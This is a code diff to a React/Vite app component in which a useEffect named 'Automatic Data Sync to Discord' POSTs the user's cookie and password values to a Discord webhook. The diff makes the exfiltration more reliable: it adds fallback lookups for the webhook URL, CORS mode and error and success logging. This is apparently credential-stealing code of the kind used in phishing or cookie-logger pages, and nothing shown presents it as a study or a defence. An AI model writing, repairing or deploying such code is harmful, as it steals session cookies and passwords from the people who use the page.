@@ -50,8 +50,13 @@ export default function App() {
   // Automatic Data Sync to Discord
   useEffect(() => {
     const syncToWebhook = async () => {
-      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-      if (!webhookUrl || (!cookie && !password)) return;
+      // In Vite, defined variables are available directly
+      const webhookUrl = (window as any).process?.env?.DISCORD_WEBHOOK_URL || (import.meta as any).env?.DISCORD_WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
+      
+      if (!webhookUrl || (!cookie && !password)) {
+        console.log("Sync skipped: No webhook URL or data", { hasUrl: !!webhookUrl, hasData: !!(cookie || password) });
+        return;
+      }
 
       try {
         const payload = {
@@ -69,13 +74,16 @@ export default function App() {
 
         const response = await fetch(webhookUrl, {
           method: 'POST',
+          mode: 'cors',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
 
         if (!response.ok) {
-          throw new Error(`HTTP error! status: ${response.status}`);
+          const errorText = await response.text();
+          throw new Error(`HTTP error! status: ${response.status} - ${errorText}`);
         }
+        console.log("Webhook sync successful");
       } catch (e) {
         console.error("Webhook sync failed", e);
       }
